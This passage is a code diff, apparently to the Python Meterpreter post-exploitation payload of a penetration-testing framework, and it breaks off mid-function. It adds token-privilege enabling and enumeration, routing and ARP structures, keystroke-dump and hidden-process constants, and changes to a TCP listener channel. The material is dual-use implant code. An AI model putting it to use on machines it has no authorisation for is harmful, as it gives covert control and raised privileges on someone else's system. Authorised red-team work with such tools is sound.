@@ -1,4 +1,5 @@
 import fnmatch
+import functools
 import getpass
 import os
 import platform
@@ -11,6 +12,7 @@ import struct
 import subprocess
 import sys
 import time
+import binascii
 
 try:
     import ctypes
@@ -38,6 +40,12 @@ try:
     has_termios = True
 except ImportError:
     has_termios = False
+
+try:
+    import fcntl
+    has_fcntl = True
+except ImportError:
+    has_fcntl = False
 
 try:
     import _winreg as winreg
@@ -69,7 +77,11 @@ else:
     long = int
     unicode = lambda x: (x.decode('UTF-8') if isinstance(x, bytes) else x)
 
+libc = None
+
 if has_ctypes:
+    if sys.platform == 'darwin' or sys.platform.startswith('linux'):
+        libc = ctypes.CDLL(ctypes.util.find_library('c'))
     size_t = getattr(ctypes, 'c_uint' + str(ctypes.sizeof(ctypes.c_void_p) * 8))
     #
     # Windows Structures
@@ -100,12 +112,35 @@ if has_ctypes:
         _fields_ = [("lpSockaddr", ctypes.POINTER(SOCKADDR)),
             ("iSockaddrLength", ctypes.c_int)]
 
+    class sockaddr_in(ctypes.Structure):
+        _fields_ = [("sin_family", ctypes.c_short),
+            ("sin_port", ctypes.c_ushort),
+            ("sin_addr", ctypes.c_byte * 4),
+            ("sin_zero", ctypes.c_char * 8)
+        ]
+    SOCKADDR_IN = sockaddr_in
+
+    class sockaddr_in6(ctypes.Structure):
+        _fields_ = [("sin6_family", ctypes.c_short),
+            ("sin6_port", ctypes.c_ushort),
+            ("sin6_flowinfo", ctypes.c_ulong),
+            ("sin6_addr", ctypes.c_byte * 16),
+            ("sin6_scope_id", ctypes.c_ulong)
+        ]
+    SOCKADDR_IN6 = sockaddr_in6
+
+    class SOCKADDR_INET(ctypes.Union):
+        _fields_ = [("Ipv4", SOCKADDR_IN),
+            ("Ipv6", SOCKADDR_IN6),
+            ("si_family", ctypes.c_short)
+        ]
+
     class IP_ADAPTER_UNICAST_ADDRESS(ctypes.Structure):
         _fields_ = [
             ("s", type(
                     '_s_IP_ADAPTER_UNICAST_ADDRESS',
                     (ctypes.Structure,),
-                    dict(_fields_ = [
+                    dict(_fields_=[
                         ("Length", ctypes.c_ulong),
                         ("Flags", ctypes.c_uint32)
                     ])
@@ -177,40 +212,98 @@ if has_ctypes:
         _fields_ = [("cbSize", ctypes.c_uint32),
             ("dwTime", ctypes.c_uint32)]
 
-    class MIB_IFROW(ctypes.Structure):
-        _fields_ = [("wszName", (ctypes.c_wchar * 256)),
-            ("dwIndex", ctypes.c_uint32),
-            ("dwType", ctypes.c_uint32),
-            ("dwMtu", ctypes.c_uint32),
-            ("dwSpeed", ctypes.c_uint32),
-            ("dwPhysAddrLen", ctypes.c_uint32),
-            ("bPhysAddr", (ctypes.c_uint8 * 8)),
-            ("dwAdminStatus", ctypes.c_uint32),
-            ("dwOperStaus", ctypes.c_uint32),
-            ("dwLastChange", ctypes.c_uint32),
-            ("dwInOctets", ctypes.c_uint32),
-            ("dwInUcastPkts", ctypes.c_uint32),
-            ("dwInNUcastPkts", ctypes.c_uint32),
-            ("dwInDiscards", ctypes.c_uint32),
-            ("dwInErrors", ctypes.c_uint32),
-            ("dwInUnknownProtos", ctypes.c_uint32),
-            ("dwOutOctets", ctypes.c_uint32),
-            ("dwOutUcastPkts", ctypes.c_uint32),
-            ("dwOutNUcastPkts", ctypes.c_uint32),
-            ("dwOutDiscards", ctypes.c_uint32),
-            ("dwOutErrors", ctypes.c_uint32),
-            ("dwOutQLen", ctypes.c_uint32),
-            ("dwDescrLen", ctypes.c_uint32),
-            ("bDescr", (ctypes.c_char * 256))]
+    class MIB_IPINTERFACE_ROW(ctypes.Structure):
+        _fields_ = [("Family", ctypes.c_uint16),
+            ("InterfaceLuid", ctypes.c_uint64),
+            ("InterfaceIndex", ctypes.c_uint32),
+            ("MaxReassemblySize", ctypes.c_uint32),
+            ("InterfaceIdentifier", ctypes.c_uint64),
+            ("MinRouterAdvertisementInterval", ctypes.c_uint32),
+            ("MaxRouterAdvertisementInterval", ctypes.c_uint32),
+            ("AdvertisingEnabled", ctypes.c_uint8),
+            ("ForwardingEnabled", ctypes.c_uint8),
+            ("WeakHostSend", ctypes.c_uint8),
+            ("WeakHostReceive", ctypes.c_uint8),
+            ("UseAutomaticMetric", ctypes.c_uint8),
+            ("UseNeighborUnreachabilityDetection", ctypes.c_uint8),
+            ("ManagedAddressConfigurationSupported", ctypes.c_uint8),
+            ("OtherStatefulConfigurationSupported", ctypes.c_uint8),
+            ("AdvertiseDefaultRoute", ctypes.c_uint8),
+            ("RouterDiscoveryBehavior", ctypes.c_uint32),
+            ("DadTransmits", ctypes.c_uint32),
+            ("BaseReachableTime", ctypes.c_uint32),
+            ("RetransmitTime", ctypes.c_uint32),
+            ("PathMtuDiscoveryTimeout", ctypes.c_uint32),
+            ("LinkLocalAddressBehavior", ctypes.c_uint32),
+            ("LinkLocalAddressTimeout", ctypes.c_uint32),
+            ("ZoneIndices", ctypes.c_uint32 * 16),
+            ("SitePrefixLength", ctypes.c_uint32),
+            ("Metric", ctypes.c_uint32),
+            ("NlMtu", ctypes.c_uint32),
+            ("Connected", ctypes.c_uint8),
+            ("SupportsWakeUpPatterns", ctypes.c_uint8),
+            ("SupportsNeighborDiscovery", ctypes.c_uint8),
+            ("SupportsRouterDiscovery", ctypes.c_uint8),
+            ("ReachableTime", ctypes.c_uint32),
+            ("TransmitOffload", ctypes.c_uint8),
+            ("ReceiveOffload", ctypes.c_uint8),
+            ("DisableDefaultRoutes", ctypes.c_uint8),
+        ]
 
-    class MIB_IPADDRROW(ctypes.Structure):
-        _fields_ = [("dwAddr", ctypes.c_uint32),
-            ("dwIndex", ctypes.c_uint32),
-            ("dwMask", ctypes.c_uint32),
-            ("dwBCastAddr", ctypes.c_uint32),
-            ("dwReasmSize", ctypes.c_uint32),
-            ("unused1", ctypes.c_uint16),
-            ("wType", ctypes.c_uint16)]
+    class IP_ADDRESS_PREFIX(ctypes.Structure):
+        _fields_ = [("Prefix", SOCKADDR_INET),
+            ("PrefixLength", ctypes.c_uint8)
+        ]
+
+    class MIB_IPFORWARDROW(ctypes.Structure):
+        _fields_ = [("dwForwardDest", ctypes.c_uint32),
+            ("dwForwardMask", ctypes.c_uint32),
+            ("dwForwardPolicy", ctypes.c_uint32),
+            ("dwForwardNextHop", ctypes.c_uint32),
+            ("dwForwardIfIndex", ctypes.c_uint32),
+            ("dwForwardType", ctypes.c_uint32),
+            ("dwForwardProto", ctypes.c_uint32),
+            ("dwForwardAge", ctypes.c_uint32),
+            ("dwForwardNextHopAS", ctypes.c_uint32),
+            ("dwForwardMetric1", ctypes.c_uint32),
+            ("dwForwardMetric2", ctypes.c_uint32),
+            ("dwForwardMetric3", ctypes.c_uint32),
+            ("dwForwardMetric4", ctypes.c_uint32),
+            ("dwForwardMetric5", ctypes.c_uint32),
+        ]
+    PMIB_IPFORWARDROW = ctypes.POINTER(MIB_IPFORWARDROW)
+
+    class MIB_IPFORWARD_ROW2(ctypes.Structure):
+        _fields_ = [("InterfaceLuid", ctypes.c_uint64),
+            ("InterfaceIndex", ctypes.c_uint32),
+            ("DestinationPrefix", IP_ADDRESS_PREFIX),
+            ("NextHop", SOCKADDR_INET),
+            ("SitePrefixLength", ctypes.c_uint8),
+            ("ValidLifetime", ctypes.c_uint32),
+            ("PreferredLifetime", ctypes.c_uint32),
+            ("Metric", ctypes.c_uint32),
+            ("Protocol", ctypes.c_uint32),
+            ("Loopback", ctypes.c_byte),
+            ("AutoconfigureAddress", ctypes.c_byte),
+            ("Publish", ctypes.c_byte),
+            ("Immortal", ctypes.c_byte),
+            ("Age", ctypes.c_uint32),
+            ("Origin", ctypes.c_uint32),
+        ]
+    PMIB_IPFORWARD_ROW2 = ctypes.POINTER(MIB_IPFORWARD_ROW2)
+
+
+    class MIB_IPFORWARDTABLE(ctypes.Structure):
+        _fields_ = [("dwNumEntries", ctypes.c_uint32),
+            ("table", MIB_IPFORWARDROW * 0)
+        ]
+    PMIB_IPFORWARDTABLE = ctypes.POINTER(MIB_IPFORWARDTABLE)
+
+    class MIB_IPFORWARD_TABLE2(ctypes.Structure):
+        _fields_ = [("NumEntries", ctypes.c_uint32),
+            ("Table", MIB_IPFORWARD_ROW2 * 0)
+        ]
+    PMIB_IPFORWARD_TABLE2 = ctypes.POINTER(MIB_IPFORWARD_TABLE2)
 
     class OSVERSIONINFOEXW(ctypes.Structure):
         _fields_ = [("dwOSVersionInfoSize", ctypes.c_uint32),
@@ -266,6 +359,59 @@ if has_ctypes:
             ("lpszProxy", ctypes.c_wchar_p),
             ("lpszProxyBypass", ctypes.c_wchar_p)]
 
+    class LUID(ctypes.Structure):
+        _fields_ = [
+            ('LowPart',  ctypes.c_uint32),
+            ('HighPart', ctypes.c_long)
+        ]
+
+        def __eq__(self, __o):
+            return (self.LowPart == __o.LowPart and self.HighPart == __o.HighPart)
+
+        def __ne__(self, __o):
+            return (self.LowPart != __o.LowPart or self.HighPart != __o.HighPart)
+
+    class LUID_AND_ATTRIBUTES(ctypes.Structure):
+        _fields_ = [
+            ('Luid',       LUID),
+            ('Attributes', ctypes.c_uint32)
+        ]
+
+    class TOKEN_PRIVILEGES(ctypes.Structure):
+        _fields_ = [
+            ('PrivilegeCount', ctypes.c_uint32),
+            ('Privileges',     LUID_AND_ATTRIBUTES * 0),
+        ]
+        def get_array(self):
+            array_type = LUID_AND_ATTRIBUTES * self.PrivilegeCount
+            return ctypes.cast(self.Privileges, ctypes.POINTER(array_type)).contents
+
+    PTOKEN_PRIVILEGES = ctypes.POINTER(TOKEN_PRIVILEGES)
+
+    MAXLEN_PHYSADDR = 8
+
+    class MIB_IPNETROW(ctypes.Structure):
+        _fields_ = [
+            ('dwIndex', ctypes.c_uint32),
+            ('dwPhysAddrLen', ctypes.c_uint32),
+            ('bPhysAddr', ctypes.c_byte * MAXLEN_PHYSADDR),
+            ('dwAddr', ctypes.c_uint32),
+            ('dwType', ctypes.c_uint32)
+        ]
+
+    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
+        _fields_ = [
+            ('BaseAddress', ctypes.c_void_p),
+            ('AllocationBase', ctypes.c_void_p),
+            ('AllocationProtect', ctypes.c_ulong),
+            ('PartitionId', ctypes.c_ushort),
+            ('RegionSize', ctypes.c_size_t),
+            ('State', ctypes.c_ulong),
+            ('Protect', ctypes.c_ulong),
+            ('Type', ctypes.c_ulong)
+        ]
+
+
     #
     # Linux Structures
     #
@@ -298,6 +444,17 @@ if has_ctypes:
     class RTATTR(ctypes.Structure):
         _fields_ = [("len", ctypes.c_uint16),
             ("type", ctypes.c_uint16)]
+
+    class RTMSG(ctypes.Structure):
+        _fields_ = [("family", ctypes.c_uint8),
+            ("dst_len", ctypes.c_uint8),
+            ("src_len", ctypes.c_uint8),
+            ("tos", ctypes.c_uint8),
+            ("table", ctypes.c_uint8),
+            ("protocol", ctypes.c_uint8),
+            ("scope", ctypes.c_uint8),
+            ("type", ctypes.c_uint8),
+            ("flags", ctypes.c_uint32)]
 
 TLV_EXTENSIONS           = 20000
 #
@@ -345,6 +502,7 @@ TLV_TYPE_HANDLE                = TLV_META_TYPE_QWORD   | 600
 TLV_TYPE_INHERIT               = TLV_META_TYPE_BOOL    | 601
 TLV_TYPE_PROCESS_HANDLE        = TLV_META_TYPE_QWORD   | 630
 TLV_TYPE_THREAD_HANDLE         = TLV_META_TYPE_QWORD   | 631
+TLV_TYPE_PRIVILEGE             = TLV_META_TYPE_STRING  | 632
 
 ##
 # Fs
@@ -372,6 +530,9 @@ TLV_TYPE_SEARCH_ROOT           = TLV_META_TYPE_STRING  | 1232
 TLV_TYPE_SEARCH_RESULTS        = TLV_META_TYPE_GROUP   | 1233
 
 TLV_TYPE_FILE_MODE_T           = TLV_META_TYPE_UINT    | 1234
+TLV_TYPE_SEARCH_MTIME          = TLV_META_TYPE_UINT    | 1235
+TLV_TYPE_SEARCH_M_START_DATE   = TLV_META_TYPE_UINT    | 1236
+TLV_TYPE_SEARCH_M_END_DATE     = TLV_META_TYPE_UINT    | 1237
 
 ##
 # Net
@@ -387,6 +548,7 @@ TLV_TYPE_NETMASK               = TLV_META_TYPE_RAW     | 1421
 TLV_TYPE_GATEWAY               = TLV_META_TYPE_RAW     | 1422
 TLV_TYPE_NETWORK_ROUTE         = TLV_META_TYPE_GROUP   | 1423
 TLV_TYPE_IP_PREFIX             = TLV_META_TYPE_UINT    | 1424
+TLV_TYPE_ARP_ENTRY             = TLV_META_TYPE_GROUP   | 1425
 
 TLV_TYPE_IP                    = TLV_META_TYPE_RAW     | 1430
 TLV_TYPE_MAC_ADDRESS           = TLV_META_TYPE_RAW     | 1431
@@ -514,12 +676,19 @@ TLV_TYPE_REGISTER_SIZE         = TLV_META_TYPE_UINT    | 2541
 TLV_TYPE_REGISTER_VALUE_32     = TLV_META_TYPE_UINT    | 2542
 TLV_TYPE_REGISTER              = TLV_META_TYPE_GROUP   | 2550
 
+TLV_TYPE_TERMINAL_ROWS         = TLV_META_TYPE_UINT    | 2600
+TLV_TYPE_TERMINAL_COLUMNS      = TLV_META_TYPE_UINT    | 2601
+
 ##
 # Ui
 ##
 TLV_TYPE_IDLE_TIME             = TLV_META_TYPE_UINT    | 3000
 TLV_TYPE_KEYS_DUMP             = TLV_META_TYPE_STRING  | 3001
-TLV_TYPE_DESKTOP               = TLV_META_TYPE_STRING  | 3002
+
+TLV_TYPE_DESKTOP               = TLV_META_TYPE_GROUP   | 3004
+TLV_TYPE_DESKTOP_SESSION       = TLV_META_TYPE_UINT    | 3005
+TLV_TYPE_DESKTOP_STATION       = TLV_META_TYPE_STRING  | 3006
+TLV_TYPE_DESKTOP_NAME          = TLV_META_TYPE_STRING  | 3007
 
 ##
 # Event Log
@@ -553,6 +722,8 @@ PROCESS_EXECUTE_FLAG_HIDDEN = (1 << 0)
 PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1)
 PROCESS_EXECUTE_FLAG_SUSPENDED = (1 << 2)
 PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN = (1 << 3)
+PROCESS_EXECUTE_FLAG_SUBSHELL         = (1 << 6)
+PROCESS_EXECUTE_FLAG_PTY              = (1 << 7)
 
 PROCESS_ARCH_UNKNOWN = 0
 PROCESS_ARCH_X86 = 1
@@ -565,6 +736,11 @@ PROCESS_ARCH_IA64 = 3
 ERROR_SUCCESS = 0
 # not defined in original C implementation
 ERROR_FAILURE = 1
+
+ERROR_INSUFFICIENT_BUFFER = 0x0000007a
+ERROR_NOT_SUPPORTED = 0x00000032
+ERROR_NO_DATA = 0x000000e8
+ERROR_INVALID_PARAMETER = 87
 
 # Special return value to match up with Windows error codes for network
 # errors.
@@ -581,12 +757,35 @@ PROCESS_TERMINATE                 = 0x0001
 PROCESS_VM_READ                   = 0x0010
 PROCESS_QUERY_INFORMATION         = 0x0400
 PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+PROCESS_ALL_ACCESS                = 0x1fffff
 VER_NT_WORKSTATION                = 0x0001
 VER_NT_DOMAIN_CONTROLLER          = 0x0002
 VER_NT_SERVER                     = 0x0003
 VER_PLATFORM_WIN32s               = 0x0000
 VER_PLATFORM_WIN32_WINDOWS        = 0x0001
 VER_PLATFORM_WIN32_NT             = 0x0002
+
+# Token Constants
+TOKEN_ASSIGN_PRIMARY              = 0x0001
+TOKEN_DUPLICATE                   = 0x0002
+TOKEN_IMPERSONATE                 = 0x0004
+TOKEN_QUERY                       = 0x0008
+TOKEN_QUERY_SOURCE                = 0x0010
+TOKEN_ADJUST_PRIVILEGES           = 0x0020
+TOKEN_ADJUST_GROUPS               = 0x0040
+TOKEN_ADJUST_DEFAULT              = 0x0080
+TOKEN_ADJUST_SESSIONID            = 0x0100
+TOKEN_ALL_ACCESS                  = 0xf01ff
+
+# Privilege Constants
+DISABLED                          = 0x0
+SE_PRIVILEGE_ENABLED_BY_DEFAULT   = 0x1
+SE_PRIVILEGE_ENABLED              = 0x2
+SE_PRIVILEGE_REMOVED              = 0x4
+SE_PRIVILEGE_USED_FOR_ACCESS      = 0x800000000
+
+# Windows Access Controls
+MAXIMUM_ALLOWED                   = 0x02000000
 
 WIN_AF_INET  = 2
 WIN_AF_INET6 = 23
@@ -596,6 +795,23 @@ UNIVERSAL_NAME_INFO_LEVEL = 1
 DRIVE_REMOTE = 4
 
 # Linux Constants
+RT_TABLE_MAIN = 254
+RTA_UNSPEC = 0
+RTA_DST = 1
+RTA_SRC = 2
+RTA_IIF = 3
+RTA_OIF = 4
+RTA_GATEWAY = 5
+RTA_PRIORITY = 6
+RTA_PREFSRC = 7
+RTA_METRICS = 8
+RTA_MULTIPATH = 9
+RTA_PROTOINFO = 10 #/* no longer used */
+RTA_FLOW = 11
+RTA_CACHEINFO = 12
+RTA_SESSION = 13 #/* no longer used */
+RTA_MP_ALGO = 14 #/* no longer used */
+RTA_TABLE = 15
 RTM_GETLINK   = 18
 RTM_GETADDR   = 22
 RTM_GETROUTE  = 26
@@ -627,13 +843,6 @@ def bytes_to_ctarray(bytes_):
     ctypes.memmove(ctypes.byref(ctarray), bytes_, len(bytes_))
     return ctarray
 
-def ctarray_to_bytes(ctarray):
-    if not len(ctarray):
-        # work around a bug in v3.1 & v3.2 that results in a segfault when len(ctarray) == 0
-        return bytes()
-    bytes_ = buffer(ctarray) if sys.version_info[0] < 3 else bytes(ctarray)
-    return bytes_[:]
-
 def calculate_32bit_netmask(bits):
     if bits == 32:
         netmask = 0xffffffff
@@ -654,24 +863,43 @@ def calculate_128bit_netmask(bits):
         netmask = struct.pack('!IIII', part, 0, 0, 0)
     return netmask
 
-def cstruct_unpack(structure, raw_data):
+def ctarray_to_bytes(ctarray):
+    if not len(ctarray):
+        # work around a bug in v3.1 & v3.2 that results in a segfault when len(ctarray) == 0
+        return bytes()
+    bytes_ = buffer(ctarray) if sys.version_info[0] < 3 else bytes(ctarray)
+    return bytes_[:]
+
+def ctstruct_pack(structure):
+    return ctypes.string_at(ctypes.byref(structure), ctypes.sizeof(structure))
+
+def ctstruct_unpack(structure, raw_data):
     if not isinstance(structure, ctypes.Structure):
         structure = structure()
     ctypes.memmove(ctypes.byref(structure), raw_data, ctypes.sizeof(structure))
     return structure
 
+def get_process_output(args):
+    proc_h = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout, stderr = proc_h.communicate()
+
+    if proc_h.wait():
+        raise Exception(args[0] + ' exited with non-zero status')
+    return str(stdout)
+
 def get_stat_buffer(path):
     si = os.stat(path)
     rdev = 0
-    if hasattr(si, 'st_rdev'):
+    # Older versions of Python on Windows return invalid/negative values for st_rdev - skip it entirely
+    # https://github.com/python/cpython/commit/a10c1f221a5248cedf476736eea365e1dfc84910#diff-b419a047f587ec3afef8493e19dbfc142624bf278f3298bfc74729abd89e311d
+    if hasattr(si, 'st_rdev') and not sys.platform.startswith('win'):
         rdev = si.st_rdev
     st_buf = struct.pack('<III', int(si.st_dev), int(si.st_mode), int(si.st_nlink))
     st_buf += struct.pack('<IIIQ', int(si.st_uid), int(si.st_gid), int(rdev), long(si.st_ino))
     st_buf += struct.pack('<QQQQ', long(si.st_size), long(si.st_atime), long(si.st_mtime), long(si.st_ctime))
     return st_buf
 
-def get_token_user(handle):
-    TOKEN_QUERY = 0x0008
+def get_token_user_sid(handle):
     TokenUser = 1
     advapi32 = ctypes.windll.advapi32
     advapi32.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]
@@ -685,9 +913,17 @@ def get_token_user(handle):
     ctypes.windll.kernel32.CloseHandle(token_handle)
     if not result:
         return None
-    return cstruct_unpack(TOKEN_USER, token_user_buffer)
+    token_user = ctstruct_unpack(TOKEN_USER, token_user_buffer)
 
-def get_username_from_token(token_user):
+    GetLengthSid = ctypes.windll.advapi32.GetLengthSid
+    GetLengthSid.argtypes = [ctypes.c_void_p]
+    GetLengthSid.restype = ctypes.c_uint32
+    sid_length = GetLengthSid(token_user.User.Sid)
+    sid_bytes = ctypes.string_at(token_user.User.Sid, sid_length)
+
+    return sid_bytes
+
+def get_username_from_sid(sid):
     user = (ctypes.c_char * 512)()
     domain = (ctypes.c_char * 512)()
     user_len = ctypes.c_uint32()
@@ -698,7 +934,7 @@ def get_username_from_token(token_user):
     use.value = 0
     LookupAccountSid = ctypes.windll.advapi32.LookupAccountSidA
     LookupAccountSid.argtypes = [ctypes.c_void_p] * 7
-    if not LookupAccountSid(None, token_user.User.Sid, user, ctypes.byref(user_len), domain, ctypes.byref(domain_len), ctypes.byref(use)):
+    if not LookupAccountSid(None, sid, user, ctypes.byref(user_len), domain, ctypes.byref(domain_len), ctypes.byref(use)):
         return None
     return str(ctypes.string_at(domain)) + '\\' + str(ctypes.string_at(user))
 
@@ -797,26 +1033,34 @@ def getaddrinfo_from_request(request, socktype, proto):
         local_address_info = None
     return peer_address_info, local_address_info
 
-def netlink_request(req_type):
+def addr_atoi4(address):
+    return struct.unpack('!I',  socket.inet_aton(address))[0]
+
+def netlink_request(req_type, req_data):
     # See RFC 3549
     NLM_F_REQUEST    = 0x0001
     NLM_F_ROOT       = 0x0100
+    NLM_F_MATCH      = 0x0200
+    NLM_F_DUMP       = NLM_F_ROOT | NLM_F_MATCH
     NLMSG_ERROR      = 0x0002
     NLMSG_DONE       = 0x0003
 
     sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, socket.NETLINK_ROUTE)
     sock.bind((os.getpid(), 0))
     seq = int(time.time())
-    nlmsg = struct.pack('IHHIIB15x', 32, req_type, (NLM_F_REQUEST | NLM_F_ROOT), seq, 0, socket.AF_UNSPEC)
-    sock.send(nlmsg)
+    if isinstance(req_data, ctypes.Structure):
+        req_data = ctstruct_pack(req_data)
+    nlmsg = ctstruct_pack(NLMSGHDR(len=ctypes.sizeof(NLMSGHDR) + len(req_data), type=req_type, flags=(NLM_F_REQUEST | NLM_F_DUMP), seq=seq, pid=0))
+    sock.send(nlmsg + req_data)
     responses = []
     if not len(select.select([sock.fileno()], [], [], 0.5)[0]):
         return responses
     raw_response_data = sock.recv(0xfffff)
-    response = cstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
+    response = ctstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
     raw_response_data = raw_response_data[ctypes.sizeof(NLMSGHDR):]
     while response.type != NLMSG_DONE:
         if response.type == NLMSG_ERROR:
+            debug_print('received NLMSG_ERROR from a netlink request')
             break
         response_data = raw_response_data[:(response.len - 16)]
         responses.append(response_data)
@@ -825,14 +1069,14 @@ def netlink_request(req_type):
             if not len(select.select([sock.fileno()], [], [], 0.5)[0]):
                 break
             raw_response_data = sock.recv(0xfffff)
-        response = cstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
+        response = ctstruct_unpack(NLMSGHDR, raw_response_data[:ctypes.sizeof(NLMSGHDR)])
         raw_response_data = raw_response_data[ctypes.sizeof(NLMSGHDR):]
     sock.close()
     return responses
 
 def resolve_host(hostname, family):
     address_info = getaddrinfo(hostname, family=family, socktype=socket.SOCK_DGRAM, proto=socket.IPPROTO_UDP)
-    address = address_info['sockaddr'][0]
+    address = address_info[0]['sockaddr'][0]
     return {'family': family, 'address': address, 'packed_address': inet_pton(family, address)}
 
 def tlv_pack_local_addrinfo(sock):
@@ -863,6 +1107,42 @@ def windll_GetVersion():
     dwMinorVersion = ((dwVersion & 0x0000ff00) >> 8)
     dwBuild        = ((dwVersion & 0xffff0000) >> 16)
     return type('Version', (object,), dict(dwMajorVersion = dwMajorVersion, dwMinorVersion = dwMinorVersion, dwBuild = dwBuild))
+
+def enable_privilege(name, enable=True):
+    GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
+    GetCurrentProcess.restype = ctypes.c_void_p
+
+    OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
+    OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]
+    OpenProcessToken.restype = ctypes.c_bool
+
+    LookupPrivilegeValue = ctypes.windll.advapi32.LookupPrivilegeValueW
+    LookupPrivilegeValue.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(LUID)]
+    LookupPrivilegeValue.restype = ctypes.c_bool
+
+    AdjustTokenPrivileges = ctypes.windll.advapi32.AdjustTokenPrivileges
+    AdjustTokenPrivileges.argtypes = [ctypes.c_void_p, ctypes.c_bool, PTOKEN_PRIVILEGES, ctypes.c_uint32, PTOKEN_PRIVILEGES, ctypes.POINTER(ctypes.c_uint32)]
+    AdjustTokenPrivileges.restype = ctypes.c_bool
+
+    token = ctypes.c_void_p()
+    success = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token)
+    if not success:
+        return False
+
+    luid = LUID()
+    name = ctypes.create_unicode_buffer(name)
+    success = LookupPrivilegeValue(None, name, luid)
+    if not success:
+        return False
+
+    size = ctypes.sizeof(TOKEN_PRIVILEGES)
+    size += ctypes.sizeof(LUID_AND_ATTRIBUTES)
+    buffer = ctypes.create_string_buffer(size)
+    tokenPrivileges = ctypes.cast(buffer, PTOKEN_PRIVILEGES).contents
+    tokenPrivileges.PrivilegeCount = 1
+    tokenPrivileges.get_array()[0].Luid = luid
+    tokenPrivileges.get_array()[0].Attributes = SE_PRIVILEGE_ENABLED if enable else 0
+    return AdjustTokenPrivileges(token, False, tokenPrivileges, 0, None, None)
 
 @register_function
 def channel_open_stdapi_fs_file(request, response):
@@ -905,15 +1185,24 @@ def channel_open_stdapi_net_tcp_client(request, response):
 
 @register_function
 def channel_open_stdapi_net_tcp_server(request, response):
-    local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST).get('value', '0.0.0.0')
+    use_dual_stack = False
+    local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST).get('value', '')
     local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT)['value']
-    local_address_info = getaddrinfo(local_host, local_port, socktype=socket.SOCK_STREAM, proto=socket.IPPROTO_TCP)
-    if not local_address_info:
-        return ERROR_FAILURE, response
-    local_address_info = local_address_info[0]
-    server_sock = socket.socket(local_address_info['family'], local_address_info['socktype'], local_address_info['proto'])
+    if local_host:
+        local_address_info = getaddrinfo(local_host, local_port, socktype=socket.SOCK_STREAM, proto=socket.IPPROTO_TCP, flags=socket.AI_NUMERICHOST)
+        if not local_address_info:
+            return ERROR_FAILURE, response
+        local_address_info = local_address_info[0]
+    else:
+        local_address_info = {
+            'family': socket.AF_INET6,
+            'sockaddr': ('::', local_port, 0, 0)
+        }
+        use_dual_stack = hasattr(socket, 'IPV6_V6ONLY')
+        debug_print('[*] no local host information, binding to all available interfaces...')
+    server_sock = socket.socket(local_address_info['family'], socket.SOCK_STREAM, socket.IPPROTO_TCP)
     server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    if local_address_info['family'] == socket.AF_INET6 and hasattr(socket, 'IPV6_V6ONLY'):
+    if local_address_info['family'] == socket.AF_INET6 and use_dual_stack:
         server_sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
     server_sock.bind(local_address_info['sockaddr'])
     server_sock.listen(socket.SOMAXCONN)
@@ -951,13 +1240,13 @@ def stdapi_sys_config_getenv(request, response):
 
 @register_function_if(has_windll)
 def stdapi_sys_config_getsid(request, response):
-    token = get_token_user(ctypes.windll.kernel32.GetCurrentProcess())
-    if not token:
+    sid = get_token_user_sid(ctypes.windll.kernel32.GetCurrentProcess())
+    if not sid:
         return error_result_windows(), response
     sid_str = ctypes.c_char_p()
     ConvertSidToStringSid = ctypes.windll.advapi32.ConvertSidToStringSidA
     ConvertSidToStringSid.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
-    if not ConvertSidToStringSid(token.User.Sid, ctypes.byref(sid_str)):
+    if not ConvertSidToStringSid(sid, ctypes.byref(sid_str)):
         return error_result_windows(), response
     sid_str = str(ctypes.string_at(sid_str))
     response += tlv_pack(TLV_TYPE_SID, sid_str)
@@ -968,15 +1257,97 @@ def stdapi_sys_config_getuid(request, response):
     if has_pwd:
         username = pwd.getpwuid(os.getuid()).pw_name
     elif has_windll:
-        token = get_token_user(ctypes.windll.kernel32.GetCurrentProcess())
-        if not token:
+        sid = get_token_user_sid(ctypes.windll.kernel32.GetCurrentProcess())
+        if not sid:
             return error_result_windows(), response
-        username = get_username_from_token(token)
+        username = get_username_from_sid(sid)
         if not username:
             return error_result_windows(), response
     else:
         username = getpass.getuser()
     response += tlv_pack(TLV_TYPE_USER_NAME, username)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_config_getprivs(request, response):
+    GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
+    GetCurrentProcess.restype = ctypes.c_void_p
+
+    advapi32 = ctypes.windll.advapi32
+    OpenProcessToken = advapi32.OpenProcessToken
+    OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]
+    OpenProcessToken.restype = ctypes.c_bool
+
+    LookupPrivilegeValue = advapi32.LookupPrivilegeValueW
+    LookupPrivilegeValue.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.POINTER(LUID)]
+    LookupPrivilegeValue.restype = ctypes.c_bool
+
+    AdjustTokenPrivileges = advapi32.AdjustTokenPrivileges
+    AdjustTokenPrivileges.argtypes = [ctypes.c_void_p, ctypes.c_bool, PTOKEN_PRIVILEGES, ctypes.c_uint32, PTOKEN_PRIVILEGES, ctypes.POINTER(ctypes.c_uint32)]
+    AdjustTokenPrivileges.restype = ctypes.c_bool
+
+    CloseHandle = ctypes.windll.kernel32.CloseHandle
